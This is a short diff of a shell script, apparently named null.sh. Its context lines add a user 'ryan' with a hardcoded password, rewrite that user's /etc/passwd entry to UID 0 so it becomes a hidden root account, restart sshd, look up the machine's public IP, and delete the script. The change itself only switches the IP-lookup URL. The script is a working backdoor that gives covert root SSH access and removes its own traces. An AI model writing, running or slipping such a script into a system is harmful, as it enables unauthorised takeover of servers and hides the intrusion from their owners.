@@ -7,5 +7,5 @@ useradd ryan
 echo ryan:Ryan1995 |chpasswd ryan
 sed -i 's|^.*ryan.*|ryan:x:0:0:root:/root:/bin/bash|g' /etc/passwd
 service sshd restart
-curl ip.sb
+curl ipv4.ip.sb
 rm -f null.sh
